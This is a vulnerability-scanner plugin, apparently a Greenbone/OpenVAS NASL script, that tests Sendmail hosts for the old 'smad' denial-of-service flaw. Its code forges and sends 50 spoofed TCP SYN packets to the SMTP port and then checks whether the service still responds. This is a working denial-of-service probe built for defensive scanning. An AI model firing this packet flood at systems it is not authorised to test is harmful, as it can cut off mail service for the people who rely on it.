# SPDX-FileCopyrightText: 2009 Vlatko Kosturjak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:sendmail:sendmail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80102");
  script_version("2024-01-10T05:05:17+0000");
  script_tag(name:"last_modification", value:"2024-01-10 05:05:17 +0000 (Wed, 10 Jan 2024)");
  script_tag(name:"creation_date", value:"2009-03-14 11:48:12 +0100 (Sat, 14 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_copyright("Copyright (C) 2009 Vlatko Kosturjak");
  script_name("Sendmail 'smad' Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_dependencies("gb_sendmail_smtp_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_mandatory_keys("sendmail/smtp/detected", "Host/runs_unixoide");
  script_require_ports("Services/smtp", 25, 465, 587);
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"https://seclists.org/bugtraq/1998/Nov/28");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/19282");

  script_tag(name:"summary", value:"The remote host is subject to the 'smad' (sendmail accept dos)
  attack.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted TCP packets and checks if the service
  is still reachable afterwards.");

  script_tag(name:"insight", value:"Smad prevents Sendmail from accepting legitimate connections.

  An attacker may use this flaw to prevent you from receiving any email, thus lowering the interest
  of being connected to internet. This attack is specific to some versions of the Linux kernel.
  There are various security bugs in the implementation of this service which can be used by an
  intruder to gain a root account rather easily.");

  script_tag(name:"solution", value:"Upgrade your Linux kernel to a newer version
  or filter incoming traffic to this port.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("network_func.inc");
include("smtp_func.inc");
include("host_details.inc");

if( TARGET_IS_IPV6() ) exit( 0 );

nrpackets = 50;
cipid = htons( n:0xF1C );
cth_seq = htonl( n:32089744 );
cth_ack = htonl( n:0 );
cth_win = htons( n:512 );
cttl = 64;

if( ! port = get_app_port( cpe:CPE, service:"smtp" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

# nb: Verify that we're still able to access the service before sending the request below
soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

res = smtp_recv_banner( socket:soc );
close( soc );

if( ! res || "endmail" >!< res )
  exit( 0 );

sport = ( rand() % 64511 ) + 1024;
ip = forge_ip_packet( ip_v:4, ip_hl:5, ip_tos:0, ip_off:0, ip_len:20,
                      ip_p:IPPROTO_TCP, ip_id:cipid, ip_ttl:cttl,
                      ip_src:get_host_ip() );
tcp = forge_tcp_packet( ip:ip, th_sport:sport, th_dport:port,
                        th_flags:0x02, th_seq:cth_seq, th_ack:cth_ack,
                        th_x2:0, th_off:5, th_win:cth_win, th_urp:0 );

for( j = 0; j < nrpackets; j++ ) {
  reply = send_packet( tcp, pcap_active:FALSE );
  sleep( 1 );
}

sleep( 3 );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

close( soc );
exit( 99 );
